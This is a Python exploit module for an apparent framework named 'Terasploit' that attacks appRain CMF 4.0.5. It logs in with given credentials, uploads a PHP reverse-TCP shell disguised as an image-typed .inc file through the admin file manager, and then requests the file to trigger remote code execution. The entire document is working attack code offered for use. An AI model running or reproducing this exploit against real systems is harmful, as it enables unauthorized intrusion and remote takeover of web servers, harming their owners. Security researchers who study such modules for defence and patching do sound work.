#######
# Module/Exploit: appRain CMF Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Name'        : 'appRain CMF Authenticated Remote Code Execution',
                'Version'     : '4.0.5',
                'Module'      : Module.exploit,
                'Payload'     : 'modules/payload/php/shell_reverse_tcp',
                'Arch'        : Arch.PHP,
                'Platform'    : Platform.PHP,
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                ],
                'Description' : [
                    'appRain CMF version 4.0.5 authenticated remote code execution',
                    'vulnerability that allows attackers to upload a shell.'
                ],
                'References'  : [
                    'https://www.exploit-db.com/exploits/52041'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptProxy.create('proxy',['','no','json file containing proxies, json format {"protocol":"proxy",...}']),
            OptBool.create('ssl_verify',['false','no','check ssl certificate on the host']),
            OptString.create('username',['','yes','username to use for authentication']),
            OptString.create('password',['','yes','password to use for authentication'])
        ])
        
        
    def login(self) -> bool:
        _, proxy, verify, username, password = self.OPT()
        
        print_info ('Logging in using specified credentials...')
        login_response = HTTP.session.post(
            url=f'{Target.scheme}://{Target.hostname}/admin/system',
            data={'data[Admin][admin_id]' : username,'data[Admin][admin_password]':password},
            headers={'Content-Type':'application/x-www-form-urlencoded'},
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(verify)
        )
        return True if 'Logout' in login_response.text else False
        

    def exploit(self) -> str|None:
        payload, _ = Get.payload()
        target, proxy, verify, _, _ = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f'{Target.scheme}://{Target.hostname}/uploads/filemanager/{rand}.inc')
        try:
            if self.login():
                exploit = HTTP.session.post(
                    url=f"https://{Target.hostname}/admin/filemanager/upload",
                    files={'data[filemanager][image]': (f"{rand}.inc", shell, 'image/jpeg')}, 
                    data={'submit':'Upload'},
                    proxies=self.GetProxy(proxy),
                    verify=self.GetBoolean(verify)
                )
                if exploit.status_code in self.good_status_code():
                    print_info (f'Uploaded: {Shell.get()}', type="GREEN")
                    print_info ('Attempting to execute payload...')
                    HTTP.Request('get',url=Shell.get(),timeout=20)
                    return
                else:
                    print_info (f'Exploit failed, status code: {exploit.status_code}',type='red')
                    return 'failed'
            else:
                print_info("Failed to login using specified credentials")
                HTTP.new_session()
                return 'failed'
                
        except Exception as error:
            print_info (error,type='red')
            HTTP.new_session()
            return 'failed'